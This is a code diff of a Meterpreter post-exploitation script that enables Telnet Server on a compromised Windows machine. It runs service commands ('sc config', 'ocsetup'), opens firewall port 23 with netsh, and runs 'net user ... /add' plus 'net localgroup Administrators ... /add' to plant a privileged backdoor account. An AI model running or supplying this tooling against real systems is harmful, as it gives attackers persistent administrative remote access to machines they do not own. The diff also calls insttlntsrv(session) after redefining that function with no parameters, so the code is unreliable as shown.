@@ -3,11 +3,22 @@
 #Meterpreter script for enabling Telnet Server on Windows 2003, Windows Vista
 #Windows 2008 and Windows XP targets using native windows commands.
 #Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.1.2
 #Note: If the Telnet Server is not installed in Vista or win2k8
 #	it will be installed.
 ################## Variable Declarations ##################
+@client = client
+host_name = client.sys.config.sysinfo['Computer']
+# Create Filename info to be appended to downloaded files
+filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
+# Create a directory for the logs
+logs = ::File.join(Msf::Config.log_directory, 'gettelnet', host_name + filenameinfo )
+
+# Create the log directory
+::FileUtils.mkdir_p(logs)
+
+# Cleaup script file name
+@dest = logs + "/clean_up_" + filenameinfo + ".rc"
 session = client
 @@exec_opts = Rex::Parser::Arguments.new(
 	"-h" => [ false, "Help menu." ],
@@ -16,121 +27,89 @@ session = client
 	"-u" => [ true,  "The Username of the user to add."  ],
 	"-f" => [ true,  "Forward Telnet Connection." ]
 )
-def checkifinst(session)
+def checkifinst()
 	# This won't work on windows 2000 since there is no sc.exe
-	r = session.sys.process.execute("sc query state= all",nil, {'Hidden' => true, 'Channelized' => true})
-	while(d = r.channel.read)
-		if d =~ (/TlntSvr/)
-			return true
-		end
+	print_status("Checking if Telnet is installed...")
+	begin
+		registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\","Start")
+		return true
+	rescue
+		return false
 
 	end
-	r.channel.close
-	r.close
 end
 
 #---------------------------------------------------------------------------------------------------------
-def insttlntsrv(session)
-	trgtos = session.sys.config.sysinfo
-	if trgtos =~ /(Windows Vista)/
-		if checkifinst(session)
+def insttlntsrv()
+	trgtos = @client.sys.config.sysinfo['OS']
+	if trgtos =~ /Vista|7|2008/
+		puts("Checking if Telnet Service is Installed")
+		if checkifinst()
 			print_status("Telnet Service Installed on Target")
 		else
-			print "[*] Installing Telnet Server Service ......"
-			session.response_timeout=90
-			r = session.sys.process.execute("pkgmgr /iu:\"TelnetServer\"",nil, {'Hidden' => true, 'Channelized' => true})
-			sleep(2)
-			prog2check = "pkgmgr.exe"
+			print_status("Installing Telnet Server Service ......")
+			cmd_exec("cmd /c ocsetup TelnetServer")
+			prog2check = "ocsetup.exe"
 			found = 0
 			while found == 0
-				session.sys.process.get_processes().each do |x|
+				@client.sys.process.get_processes().each do |x|
 					found =1
 					if prog2check == (x['name'].downcase)
-						print "."
+						puts "*"
 						sleep(0.5)
 						found = 0
 					end
 				end
 			end
-			r.channel.close
-			r.close
+			file_local_write2file(@dest,"execute -H -f cmd.exe -a \"/c ocsetup TelnetServer /uninstall\"")
 			print_status("Finished installing the Telnet Service.")
-			end
+			
 		end
-	end
-
-#---------------------------------------------------------------------------------------------------------
-def enabletlntsrv(session)
-	tmpout = [ ]
-	cmdout = []
-	key2 = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TlntSvr"
-	root_key2, base_key2 = session.sys.registry.splitkey(key2)
-	value2 = "Start"
-	begin
-	open_key = session.sys.registry.open_key(root_key2, base_key2, KEY_READ)
-	v2 = open_key.query_value(value2)
-	print_status "Setting Telnet Server Services service startup mode"
-	if v2.data != 2
-		print_status "\tThe Telnet Server Services service is not set to auto, changing it to auto ..."
-		cmmds = [ 'sc config TlntSvr start= auto', "sc start TlntSvr", ]
-		cmmds. each do |cmd|
-			r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
-			while(d = r.channel.read)
-				tmpout << d
-			end
-			cmdout << tmpout
-			r.channel.close
-			r.close
-			end
-	else
-		print_status "\tTelnet Server Services service is already set to auto"
-	end
-	# Enabling Exception on the Firewall
-	print_status "\tOpening port in local firewall if necessary"
-	r = session.sys.process.execute('netsh firewall set portopening protocol = tcp port = 23 mode = enable', nil, {'Hidden' => true, 'Channelized' => true})
-	while(d = r.channel.read)
-		tmpout << d
-	end
-	cmdout << tmpout
-	r.channel.close
-	r.close
-	rescue::Exception => e
-			print_status("The following Error was encountered: #{e.class} #{e}")
+	elsif trgtos =~ /2003/
+		file_local_write2file(@dest,"reg setval -k \"HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\\" -v 'Start' -d \"1\"")
 	end
 end
 #---------------------------------------------------------------------------------------------------------
-def addrdpusr(session, username, password)
-	tmpout = [ ]
-	cmdout = []
+def enabletlntsrv()
+	key2 = "HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\"
+	value2 = "Start"
+	begin
+		v2 = registry_getvaldata(key2,value2)
+		print_status "Setting Telnet Server Services service startup mode"
+		if v2 != 2
+			print_status "\tThe Telnet Server Services service is not set to auto, changing it to auto ..."
+			cmmds = [ 'sc config TlntSvr start= auto', "sc start TlntSvr", ]
+			cmmds. each do |cmd|
+				cmd_exec(cmd)
+			end
+		else
+			print_status "\tTelnet Server Services service is already set to auto"
+		end
+		# Enabling Exception on the Firewall
+		print_status "\tOpening port in local firewall if necessary"
+		cmd_exec('netsh firewall set portopening protocol = tcp port = 23 mode = enable')
+	
+	rescue::Exception => e
+		print_status("The following Error was encountered: #{e.class} #{e}")
+	end
+
+end
+#---------------------------------------------------------------------------------------------------------
+def addrdpusr(username, password)
 	print_status "Setting user account for logon"
 	print_status "\tAdding User: #{username} with Password: #{password}"
 	begin
-	r = session.sys.process.execute("net user #{username} #{password} /add", nil, {'Hidden' => true, 'Channelized' => true})
-	while(d = r.channel.read)
-		tmpout << d
-	end
-	cmdout << tmpout
-	r.channel.close
-	r.close
-	print_status "\tAdding User: #{username} to local group TelnetClients"
-	r = session.sys.process.execute("net localgroup \"TelnetClients\" #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
-	while(d = r.channel.read)
-		tmpout << d
-	end
-	cmdout << tmpout
-	r.channel.close
-	r.close
-	print_status "\tAdding User: #{username} to local group Administrators"
-	r = session.sys.process.execute("net localgroup Administrators #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
-	while(d = r.channel.read)
-		tmpout << d
-	end
-	cmdout << tmpout
-	r.channel.close
-	r.close
-	print_status "You can now login with the created user"
+		cmd_exec("net user #{username} #{password} /add")
+		file_local_write2file(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
+		print_status "\tAdding User: #{username} to local group TelnetClients"
+		cmd_exec("net localgroup \"TelnetClients\" #{username} /add")
+
+		print_status "\tAdding User: #{username} to local group Administrators"
+		cmd_exec("net localgroup Administrators #{username} /add")
+
+		print_status "You can now login with the created user"
 	rescue::Exception => e
-			print_status("The following Error was encountered: #{e.class} #{e}")
+		print_status("The following Error was encountered: #{e.class} #{e}")
 	end
 end
 #---------------------------------------------------------------------------------------------------------
@@ -141,6 +120,7 @@ def usage
 	print_line("Windows Telnet Server Enabler Meterpreter Script")
 	print_line("Usage: gettelnet -u <username> -p <password>")
 	print_line(@@exec_opts.usage)
+	raise Rex::Script::Completed
 end
 ################## MAIN ##################
 # Parsing of Options
@@ -150,29 +130,31 @@ frwrd = nil
 enbl = nil
 @@exec_opts.parse(args) { |opt, idx, val|
 	case opt
-		when "-u"
-			usr = val
-		when "-p"
-			pass = val
-		when "-h"
-			usage
-		when "-f"
-			frwrd = true
-		when "-e"
-			enbl = true
-		end
+	when "-u"
+		usr = val
+	when "-p"
+		pass = val
+	when "-h"
+		usage
+	when "-f"
+		frwrd = true
+	when "-e"
+		enbl = true
+	end
 
 }
 if enbl
 	message
 	insttlntsrv(session)
-	enabletlntsrv(session)
+	enabletlntsrv()
+	print_status("For cleanup use command: run multi_console_command -rc #{@dest}")
 
 elsif usr!= nil && pass != nil
 	message
 	insttlntsrv(session)
-	enabletlntsrv(session)
-	addrdpusr(session, usr, pass)
+	enabletlntsrv()
+	addrdpusr(usr, pass)
+	print_status("For cleanup use command: run multi_console_command -rc #{@dest}")
 
 else
 	usage
